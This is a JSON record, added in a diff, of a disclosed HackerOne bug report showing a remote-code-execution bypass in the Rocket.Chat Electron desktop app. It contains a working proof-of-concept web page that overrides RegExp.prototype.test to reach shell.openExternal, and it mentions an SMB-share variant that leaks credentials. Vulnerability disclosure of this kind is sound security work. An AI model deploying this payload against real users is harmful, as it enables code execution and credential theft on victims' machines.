@@ -1,0 +1,126 @@
+{
+  "id": 843171,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NDMxNzE=",
+  "url": "https://hackerone.com/reports/843171",
+  "title": "Desktop app RCE (#276031 bypass)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-08T11:45:02.662Z",
+  "submitted_at": "2020-04-08T11:45:02.662Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ivarsvids",
+    "url": "/ivarsvids",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6lao3ptgw6nz82qkmxu49mp9ncqq/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-11-05T07:21:27.861Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-10-06T07:21:18.313Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** #276031 fix bypass, two click remote code execution.\n\n**Description:** The security issue is in links preload file https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/preload/links.js file.\nBy rewriting  `RegExp.prototype.test` method it is possible to prepare proper answers to get to the `shell.openExternal` method. To trigger  events attached by `addEventListener` you can use `dispatchEvent` method.\n\nNote: for demo I pointed to `calc.exe`, it also cloud be pointed, to SMB share (example. `\\\\server\\share\\executable.exe`), which can lead to windows credential leak and attacker also can execute arbitrary code on victims machine.\n\ni believe this issue is cross-platform, an can be exploited in Linux, MacOS with minor JavaScript modifications.\n\n## Releases Affected:\n\n  * Rocket.Chat.Electron 2.17.9 \n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Create web page with following `index.html`\n```\n<html>\n\t<head>\n\t</head>\n\t<body style=\"background-color: white;\" >\n\t\t<h1>Initializing surprise in 3, 2, 1</h1>\n\t\t<script>\n\t\t\tsetTimeout(() => {\n\t\t\t\t// create link\n\t\t\t\tlet a = document.createElement('A');\n\t\t\t\ta.setAttribute('href', 'c:\\\\windows\\\\system32\\\\calc.exe');\n\n\t\t\t\t// hooks regexp.test\n\t\t\t\tRegExp.prototype._test = RegExp.prototype._test || RegExp.prototype.test;\n\t\t\t\tRegExp.prototype.test = function(...args){\n\t\t\t\t\treturn this.source === '^([a-z]+:)?\\\\/\\\\/' || this._test(...args);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// add missing method\n\t\t\t\tdocument.closest = () => a;\n\n\t\t\t\t// triger event\n\t\t\t\tdocument.dispatchEvent(new Event('click'));\n\n\t\t\t\t//cleanup\n\t\t\t\tRegExp.prototype.test = RegExp.prototype._test;\n\t\t\t\tdelete RegExp.prototype._test;\n\t\t\t}, 100);\n\t\t</script>\n\t</body>\n</html>\n```\n  2. create `api/info` which contains JSON, can be empty JSON.\n  3. Add new server\n\n## Supporting Material/References:\n\n{F779066}\n\n## Suggested mitigation\n\nI understand that deep-links and `Add new server` are a features and not bugs\n* The simplest fix would be to check `isTrusted` attribute for events, but I'm 100% certain that it can be bypassed.\n* Enable context isolation (https://github.com/electron/electron/blob/master/docs/tutorial/security.md#3-enable-context-isolation-for-remote-content)\n\n## Impact\n\nAn attacker can trick victim to click on deep-link or add self hosted server to desktop application, which leads to remote code execution. I understand that deep-links and/or self hosted servers are not a bug, but it can be used in attack vector.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 779066,
+      "file_name": "rocket_rce.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/suwfPfXGLzFKXE5RhPgqnY9n?response-content-disposition=attachment%3B%20filename%3D%22rocket_rce.gif%22%3B%20filename%2A%3DUTF-8%27%27rocket_rce.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6UDGEAWX%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T083215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDtomjzste%2FJyV7XywzlEJQYeqQ2gl1GbRXR68XAax2ZAIhAOXu4GCq8m%2Baons%2BoeD1F5wi6eBebA%2Flbq7z6%2BT5S13%2BKrIFCBEQAxoMMDEzNjE5Mjc0ODQ5Igz0Z1zn%2F0sHyj01UDIqjwU1Vm8BSQ8mwy%2F6URVMkd4PMFnas4kNcnyAhizE%2FtAF0Zo2Rf6osehF9A0vFXUqzBhf%2Bx0tn9BCykRmXL4LADQW2zG0CjvKZ8o0FRejBpfc4ABGr0s2kaBm20dZN46YJj%2Fci9fvZZXks24BJ4R9FMOr8BTuVz1b6QJuLu5ZvF5SijVlIc7qDZpcNOQwUKQGZCKhAiyKxV%2FPdj2wtABwdYRFChvP5HrC0OEE1b1JkM2XVLw3MrttmYe79K24scbCWlu8TNxqz0c%2FHPqayQ2dcErgzkMB%2BG35OzxBXU6KuQhgq3x1CaBaQmC53tpFEwzHDIqZAjrCB3v2l1n8xP9RpfzVSUPz1Pw0mgEQ9vCVLos1WkT5c%2BVghNfCgtN3ZZNakSb0Xo63aLDeyNrDmRQ8N%2B0cAT39RFVD0dFvarC3AlomGqz73cmjaGlZBK6npaBOjh1VijNsw9IEssbOxzts8eaEYK04YEGZiArUQdOKUa6NSYTFNE9DySi12E6zuoqSUQ1%2BM3xg5%2F9a2ezeWFPMfkI%2Fk9xd2H8QobL5HDm%2BQxoo1Xd6C5TY0CDPjWc%2FVJ3Vg%2FujtX7B4YRVGnIhw%2FoVcet%2B7BLsy8samnFShP75uWkw2TESNibZccSBFG796cZdoI9LTNSeL4unuO2lr5qZbVZ%2B%2FQUOVomf6UIfEiz9ILQjOk0%2BeK70YMy6KsInBS4cs6KqHtW6uE0qiPxPC9Sf7YzmKg%2BNKHU8n9%2FJw%2FqdR08dm8FIvGCU3ChxBLT3c25ARE1rgNzEq8WwPQrJLsh4rw%2BPPKCi%2FaLX%2BPeMqnZoxYGJwWYRGsecNgVXF9N06HvTmAyFbl4qGh3DTeqixRHICHUfrCgOj91rnM8kOOeD7hRPMOHkvsYGOrABpQSx1GCRLInHCXgDgl1ei25b5ml%2FW5yrarH%2F4hx%2Bpaa2NMHSkoQOdGhh4sgYrEm%2Fg8oceBhDenU%2FCZmSorsoUVnuQ8C%2FNWEvu2Wg8KqMzrZH7Ek10qtr%2BHD5B7EUJL%2FtIDQV%2BnRfKsDezaCHqPTezQYVw1%2BhPbFCChJ54naSnmcfE3%2FgNFA86zKuNC6LwZ%2B%2FE7Ca5CrnxQljX1VW8ORWPAWCMpgJnIFZwdXgidA9r%2BA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e95353fdfe3bc705d5c5f1d8b6ca24b00cb81499e7f3e0ec41c095391a538602",
+      "file_size": 279297,
+      "type": "image/gif",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-11-05T07:21:18.396Z",
+  "allow_singular_disclosure_after": -153882657.46643516,
+  "singular_disclosure_allowed": true,
+  "vote_count": 16,
+  "voters": [
+    "fabianfreyer",
+    "pat_ventuzelo",
+    "haxor31337",
+    "mainteemoforfun",
+    "oskarsv",
+    "dmc3",
+    "hundredpercent",
+    "ajdumanhug",
+    "anass17",
+    "oggy6298",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
